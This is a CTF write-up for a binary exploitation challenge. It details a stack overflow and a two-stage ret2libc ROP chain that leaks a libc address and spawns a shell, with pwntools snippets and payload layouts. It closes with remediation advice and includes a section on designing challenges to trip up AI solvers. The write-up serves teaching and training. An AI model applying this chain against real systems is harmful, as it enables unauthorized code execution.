# SecurinetsENIT CTF - Libc Voyage Technical Writeup

- **Wave:** 3 (Mastery & Anti-AI)
- **Category:** Pwn / Binary Exploitation
- **Difficulty:** Advanced
- **Target OS:** Ubuntu 22.04 LTS (x86_64)
- **Mitigations:**
  - Canary: Disabled (`-fno-stack-protector`)
  - NX: Enabled
  - PIE: Disabled (`-no-pie`)
  - No Win Function present!

---

## 1. Vulnerability Analysis

In `voyage()`:
```c
char ship_log[64];
read(0, ship_log, 160);
```
Offset to Saved RIP:
- `ship_log`: 64 bytes
- Saved `RBP`: 8 bytes
- Total: `64 + 8 = 72 bytes`.

Unlike all previous challenges, **there is NO `win()` function** in the binary.
To gain code execution, we must execute a classic **ret2libc** attack by invoking `system("/bin/sh")` from the dynamically linked C library (`libc.so.6`).

---

## 2. The Anti-AI Trap: Multi-Stage Execution & Re-Entering Main

An AI prompt that tries to produce a 1-shot exploit will fail because:
1. Under ASLR, libc is loaded at a randomized base address every run.
2. We cannot call `system()` until we have **leaked** a real runtime libc address.
3. Once we leak the address, the binary must not crash: it must loop back to `main()` so we can send a second stage payload!

Automated solvers frequently fail to reconstruct this multi-stage interaction or miss the 16-byte stack alignment rule before entering `system()`.

---

## 3. Two-Stage Exploitation Walkthrough

### Stage 1: Leaking Libc Address & Returning to Main
We construct a ROP chain to call:
`puts(puts@got)`
followed by calling `main` to re-enter the program:

```
[ 72 bytes Padding ]
[ p64(pop_rdi_ret) ]
[ p64(puts_got) ]          <- Argument RDI = puts@got
[ p64(puts_plt) ]          <- Call puts@plt to print the resolved address
[ p64(main_addr) ]         <- Return back to main() for Stage 2
```

When this runs, the binary prints the 6-byte runtime address of `puts`:
```python
leaked_bytes = p.recvline().strip()
leaked_puts = u64(leaked_bytes.ljust(8, b"\x00"))
```

### Stage 2: Calculating Base & Spawning Shell
With the provided Ubuntu 22.04 libc:
```python
libc.address = leaked_puts - libc.symbols["puts"]
bin_sh = next(libc.search(b"/bin/sh"))
system_addr = libc.symbols["system"]
```

Now the binary is back in `main()` and waiting for input again!
We send the second ROP chain:
```
[ 72 bytes Padding ]
[ p64(ret_gadget) ]        <- 16-byte stack alignment (CRITICAL!)
[ p64(pop_rdi_ret) ]
[ p64(bin_sh) ]            <- RDI points to "/bin/sh"
[ p64(system_addr) ]       <- Execute system("/bin/sh")
```
We receive an interactive root shell and read `flag.txt`!

---

## 4. Defensive Remediation & Secure Coding

1. Always enforce array bounds on buffer inputs:
   ```c
   read(0, ship_log, sizeof(ship_log));
   ```
2. Compile with Full RELRO (`-Wl,-z,relro,-z,now`), Stack Canaries, and PIE.
